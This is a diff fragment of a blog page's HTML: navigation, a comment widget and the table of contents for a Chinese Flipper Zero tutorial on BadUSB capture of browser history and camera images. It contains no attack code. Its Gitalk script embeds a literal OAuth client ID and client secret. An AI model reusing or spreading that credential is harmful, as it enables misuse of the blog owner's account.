+                                <span class="post-nav-title-item">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day20 - 控制與創造：Flipper Zero GPIO 帶來的無限領域</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/10/02/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day18-%E7%A5%9E%E9%9A%B1%E5%B0%91%E5%B9%B4%EF%BC%9A%E6%82%84%E7%84%A1%E8%81%B2%E6%81%AF%E7%9A%84%E9%80%8F%E9%81%8E-BadUSB-%E9%81%A0%E7%AB%AF%E6%88%AA%E5%9C%96%E8%87%B3%E4%BD%A0%E7%9A%84-TG-BOT%EF%BC%81/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day18 - 神隱少年：悄無聲息的透過 BadUSB 遠端截圖至你的 TG BOT！</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="//cdn.staticfile.org/gitalk/1.8.0/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: '68fd7e0e6c37358fbb4f',
+                    clientSecret: 'dc6a9d6490a92521e96b38717770845226846c62',
+                    repo: 'kazmatw.github.io',
+                    owner: 'kazmatw',
+                    admin: ['kazmatw'],
+                    id: __gitalk__pathname,
+                    language: 'en',
+                    proxy: 'https://github.com/login/oauth/access_token'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
 </div>
 
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day19 - 1、2、3、笑一個！用 BadUSB 捕捉你朋友燦爛的笑容！</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B3%87%E5%AE%89%E5%80%AB%E7%90%86%E5%AE%A3%E5%B0%8E"><span class="nav-text">資安倫理宣導</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Browser-History"><span class="nav-text">Browser History</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Camera"><span class="nav-text">Camera</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%89%E8%AE%9A%E8%A8%82%E9%96%B1%E6%94%B6%E8%97%8F%E5%B0%8F%E9%88%B4%E5%99%B9%E5%8F%AE%E5%8F%AE%E5%8F%AE"><span class="nav-text">按讚訂閱收藏小鈴噹叮叮叮</span></a></li></ol>
+
+    </div>
 </div>
+        </div>
+    
+</div>
+
 
 
                 
@@ -839,6 +978,27 @@
         </div>
     </div>
 
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
     
 
     <div class="right-side-tools-container">
